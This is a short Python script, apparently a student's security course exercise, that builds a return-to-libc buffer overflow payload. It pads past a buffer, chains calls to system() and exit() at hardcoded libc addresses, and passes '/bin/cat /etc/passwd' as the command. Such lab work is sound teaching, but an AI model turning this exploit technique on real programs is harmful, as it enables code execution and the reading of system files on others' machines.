#!/usr/bin/env python3

# malicious_input2.py
# I pledge my honor that I have abided by the Stevens Honor System.
#   Justin Ho

import sys

oflow   = b'A' * 0x10c
string  = b"/bin/cat /etc/passwd\0"
fakeret = b'\xef\xbe\xad\xde'

# gadget (pop -> ret)
exit_gadget = b'\x8d\x83\x04\x08'

# address of the top of the buffer
buffer_start = 0xffffd1c0

# string is offset by 0x10c + 24 bytes from buffer_start
string_addr = buffer_start + 0x10c + 24

libc_base     = 0xf7e0c000
system_offset = 0x0003adb0
system_addr   = libc_base + system_offset
exit_offset   = 0x0002e9e0
exit_addr     = libc_base + exit_offset

frames = [
    # system, exit_gadget, string
    [system_addr.to_bytes(4, byteorder='little'),
     exit_gadget,
     string_addr.to_bytes(4, byteorder='little')],

    # exit, fakeret, 1
    [exit_addr.to_bytes(4, byteorder='little'),
     fakeret,
     b'\x01\x01\x01\x01']
]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
